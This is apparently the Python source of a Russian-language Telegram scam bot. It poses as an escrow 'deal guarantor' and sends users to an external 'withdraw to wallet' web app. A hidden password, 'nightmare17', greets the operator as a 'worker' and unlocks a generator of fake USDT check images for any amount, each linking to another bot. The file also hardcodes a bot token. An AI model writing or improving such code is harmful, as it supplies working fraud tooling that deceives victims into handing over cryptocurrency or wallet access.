import telebot
from telebot import types
from PIL import Image, ImageDraw, ImageFont
import random
import time

bot = telebot.TeleBot('8706491880:AAEvTvIW5sOu2xP2JlK9-1Kk0bOn_0az1tE')

def generate_crypto_card(amount, filename="crypto_card.png"):

    img = Image.open("card.jpg").convert("RGB").resize((1100,550))

    width, height = img.size
    draw = ImageDraw.Draw(img)

    # шрифты
    try:
        big_font = ImageFont.truetype("arial.ttf", 180)
        mid_font = ImageFont.truetype("arial.ttf", 70)
    except:
        big_font = ImageFont.load_default()
        mid_font = ImageFont.load_default()

    # основной текст
    main_text = f"${amount}"

    bbox = draw.textbbox((0,0), main_text, font=big_font)
    text_w = bbox[2] - bbox[0]

    main_x = (width - text_w) / 2
    main_y = height * 0.30

    draw.text(
        (main_x, main_y),
        main_text,
        fill="white",
        font=big_font
    )

    # нижняя строка
    label = f"{amount} USDT"

    bbox = draw.textbbox((0,0), label, font=mid_font)
    label_w = bbox[2] - bbox[0]

    label_x = (width - label_w) / 2
    label_y = height * 0.63

    draw.text(
        (label_x, label_y),
        label,
        fill="white",
        font=mid_font
    )

    draw.text(
        (label_x - 45, label_y),
        "₮",
        fill="white",
        font=mid_font
    )

    img.save(filename)

    return filename

@bot.message_handler(commands=['start'])
def start_command(message):
    markup = types.InlineKeyboardMarkup(row_width=True)
    web_app = types.WebAppInfo('https://crypto-keeper.up.railway.app/')
    but1 = types.InlineKeyboardButton(text='Вывести деньги на кошелёк', web_app= web_app)
    markup.add(but1)
    bot.send_message(message.chat.id, '👋 Добро пожаловать в бота-гаранта сделок!\n\n🔐 Бот обеспечивает безопасный перевод средств через криптовалюту между покупателем и продавцом.', reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "🧾ЧЕК")
def ask_amount(message):
    bot.send_message(message.chat.id, "Введите сумму USDT:")
    bot.register_next_step_handler(message, get_amount)

@bot.message_handler(content_types=['text'])
def handler(message):
    if message.text.lower() == 'nightmare17':
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        but1 = types.KeyboardButton('🧾ЧЕК')
        markup.add(but1)
        bot.send_message(message.chat.id, 'Приветствую тебя, воркер)', reply_markup=markup)


def get_amount(message):
    try:
        amount = int(message.text)

        file = generate_crypto_card(amount)

        with open(file, "rb") as img:
            markup = types.InlineKeyboardMarkup(row_width=True)
            but1 = types.InlineKeyboardButton(text=f'Получить {amount} USDT', url='t.me/nightmareteam_bot')
            markup.add(but1)
            bot.send_photo(message.chat.id, img, caption=f"🦋 Чек на 🌑{amount} USDT (${amount}).", reply_markup=markup)

    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка: {e}")


while True:
    try:
        bot.polling(none_stop=True, interval=0, timeout=30)
    except Exception as e:
        print(f"Ошибка в polling: {e}")
        time.sleep(3)
